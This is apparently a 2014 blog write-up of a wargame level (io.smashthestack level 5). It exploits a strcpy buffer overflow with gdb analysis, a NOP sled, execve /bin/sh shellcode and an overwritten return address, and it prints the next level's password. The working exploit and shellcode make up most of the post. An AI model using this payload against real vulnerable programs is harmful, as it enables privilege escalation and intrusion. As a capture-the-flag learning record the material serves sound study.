---
title: "SMASH THE STACK LEVEL 5"
date: 2014-12-03T13:59:04+00:00
url: "/smash-the-stack-level-5/"
draft: false
description: "still smashing :D echo one :D let's see the source code strcpy :D today I meet many strcpy so nice my memory will be hardcoded with strcpy let's smash it we..."
categories: ["Bash", "blog", "exploit-dev", "Linux", "Security", "tech"]
---

still smashing :D

```bash
level5@io:/levels$ ./level05
level5@io:/levels$ ./level05 a
a
level5@io:/levels$
```

echo one :D

let's see the source code

```c
level5@io:/levels$ cat level05.c
#include 
#include

int main(int argc, char **argv) {

char buf[128];

if(argc < 2) return 1;

strcpy(buf, argv[1]);

printf("%s\n", buf);

return 0;
}
```

strcpy :D today I meet many strcpy so nice my memory will be hardcoded with strcpy let's smash it

we have 128 buffer lol

```bash
level5@io:/levels$ ./level05 $(python -c "print 'A' * 140")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

 

now gdb love :D

```x86asm
Starting program: /levels/level05 $(python -c "print 'A' * 144")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) info registers
eax 0x0 0
ecx 0xbffffb48 -1073743032
edx 0xb7fd0360 -1208155296
ebx 0xb7fceff4 -1208160268
esp 0xbffffc10 0xbffffc10
ebp 0x41414141 0x41414141
esi 0x0 0
edi 0x0 0
eip 0x41414141 0x41414141
eflags 0x10292 [ AF SF IF RF ]
cs 0x73 115
ss 0x7b 123
ds 0x7b 123
es 0x7b 123
fs 0x0 0
gs 0x33 51
(gdb)
```

 

EIP overwrite

lets figure how it works in memory

```x86asm
(gdb) disassemble main
Dump of assembler code for function main:
0x080483b4 <+0>: push %ebp
0x080483b5 <+1>: mov %esp,%ebp
0x080483b7 <+3>: sub $0xa8,%esp
0x080483bd <+9>: and $0xfffffff0,%esp
0x080483c0 <+12>: mov $0x0,%eax
0x080483c5 <+17>: sub %eax,%esp
0x080483c7 <+19>: cmpl $0x1,0x8(%ebp)
0x080483cb <+23>: jg 0x80483d9 <main+37>
0x080483cd <+25>: movl $0x1,-0x8c(%ebp)
0x080483d7 <+35>: jmp 0x8048413 <main+95>
0x080483d9 <+37>: mov 0xc(%ebp),%eax
0x080483dc <+40>: add $0x4,%eax
0x080483df <+43>: mov (%eax),%eax
0x080483e1 <+45>: mov %eax,0x4(%esp)
0x080483e5 <+49>: lea -0x88(%ebp),%eax
0x080483eb <+55>: mov %eax,(%esp)
0x080483ee <+58>: call 0x80482d4 <strcpy@plt>
0x080483f3 <+63>: lea -0x88(%ebp),%eax
0x080483f9 <+69>: mov %eax,0x4(%esp)
0x080483fd <+73>: movl $0x8048524,(%esp)
0x08048404 <+80>: call 0x80482b4 <printf@plt> 0x08048409 <+85>: movl $0x0,-0x8c(%ebp)
0x08048413 <+95>: mov -0x8c(%ebp),%eax
---Type to continue, or q to quit---
0x08048419 <+101>: leave
0x0804841a <+102>: ret
End of assembler dump.
(gdb) b *0x080483ee
Breakpoint 1 at 0x80483ee
(gdb)
```

I did breakpoint to navigate more

```x86asm
(gdb) x/400s $esp
0xbffffde3: 'A' 
0xbffffe72: "SHELL=/bin/bash"

(gdb) x/1s 0xbffffde3
0xbffffde3: 'A' 
(gdb) x/1s 0xbffffde4
0xbffffde4: 'A' 
(gdb) x/1s 0xbffffde5
0xbffffde5: 'A' 
(gdb) x/1s 0xbffffde6
0xbffffde6: 'A' 
(gdb)
```

 

so we are here lets set the payload

we need some NOP with payload and the EIP address
I like backup this address 0xbffffde3
so lets write out payload

```bash
(gdb) r $(python -c "print '\x90' * 117 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xe3\xfd\xff\xbf'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level05 $(python -c "print '\x90' * 117 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xe3\xfd\xff\xbf'")

Breakpoint 1, 0x080483ee in main ()
(gdb) c
Continuing.
                                                                                                                     1 Ph//shh/bin  PS  
̀    
process 1860 is executing new program: /bin/bash
sh-4.2$
```

 

nice but the bad news is it didn't work from outside the gdb so i have to custom it lil bit

```x86asm
level5@io:/levels$ ./level05 $(python -c "print '\x90' * 117 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xe8\xfd\xff\xbf'")
                                                                                                                     1 Ph//shh/bin  PS  
̀    
sh-4.2$ cat /home/level6/.pass
rXCikld0ex3EQsnI
sh-4.2$
```

 

and w00t
